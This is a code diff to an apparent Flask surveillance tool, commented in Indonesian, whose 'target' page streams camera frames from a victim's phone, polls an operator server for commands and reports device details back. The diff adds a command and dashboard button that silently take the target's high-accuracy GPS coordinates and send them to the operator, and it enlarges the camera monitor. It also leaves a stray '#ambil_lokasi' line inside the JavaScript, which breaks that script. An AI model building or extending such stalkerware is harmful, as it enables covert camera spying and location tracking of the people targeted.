@@ -60,9 +60,8 @@ TARGET_HTML = """
                 fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
             }
         }
-
+        #ambil_lokasi
         async function listenServerCommand() {
-            // HP target otomatis meminta perintah dari Render secara nirkabel
             let res = await fetch('/poll_command');
             let data = await res.json();
             if (data.command) {
@@ -74,8 +73,22 @@ TARGET_HTML = """
                     report = "INFO PERANGKAT TARGET -> Platform: " + navigator.platform + " | Browser: " + navigator.userAgent + " | Bahasa: " + navigator.language;
                 } else if (data.command === "ping_test") {
                     report = "PING RESPONS -> Jalur pipa komunikasi cloud aktif 100%!";
+                } else if (data.command === "ambil_lokasi") {
+                    // Memicu GPS presisi tinggi bawaan perangkat target
+                    report = await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => {
+                                resolve("KOORDINAT TARGET (PRESISI) -> Lat: " + pos.coords.latitude + " | Long: " + pos.coords.longitude + " | Akurasi: " + pos.coords.accuracy + " meter");
+                            },
+                            (err) => {
+                                resolve("GAGAL AMBIL LOKASI -> " + err.message);
+                            },
+                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                        );
+                    });
                 }
-                // Kirim balik log hasil ke dasbor operator Akang
+                
+                // Kirim balik log hasil ke dasbor operator
                 fetch('/report_output', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -97,7 +110,10 @@ DASHBOARD_HTML = """
         body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
         .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
         .btn:hover { background: #f00; }
-        #monitor { width: 320px; height: 240px; border: 1px solid #f00; background: #000; margin-top: 10px; }
+        /* MEMPERBAIKI UKURAN MONITOR KAMERA */
+        #monitor { width: 480px; height: 360px; border: 2px solid #f00; background: #000; margin-top: 10px; display: block; }
+        /* MEMPERBESAR KOTAK LOG OUTPUT */
+        #log { background: #000; padding: 20px; border: 1px solid #333; color: cyan; font-size: 16px; width: 100%; max-width: 800px; min-height: 150px; white-space: pre-wrap; }
     </style>
 </head>
 <body>
@@ -110,6 +126,7 @@ DASHBOARD_HTML = """
     <h3>Eksekusi Perintah Nirkabel (Sekali Jalan)</h3>
     <button class="btn" onclick="sendCmd('cek_baterai')">Cek Baterai</button>
     <button class="btn" onclick="sendCmd('ambil_data_sistem')">Ambil Data Sistem</button>
+    <button class="btn" onclick="sendCmd('ambil_lokasi')">Lacak Lokasi (Lat, Long)</button>
     <button class="btn" onclick="sendCmd('ping_test')">Ping Test Jalur</button>
 
     <h3>Log Output Respons HP Target:</h3>
@@ -176,10 +193,11 @@ def get_frame():
     global latest_frame
     if latest_frame and "base64," in latest_frame:
         try:
+            # Memotong tajuk data url untuk mengambil kode enkripsi gambar mentah
             img_data = base64.b64decode(latest_frame.split("base64,")[1])
             return Response(img_data, mimetype='image/jpeg')
-        except:
-            pass
+        except Exception as e:
+            print(f"Error decoding frame: {e}")
     return "", 204
 
 @app.route('/send_command', methods=['POST'])
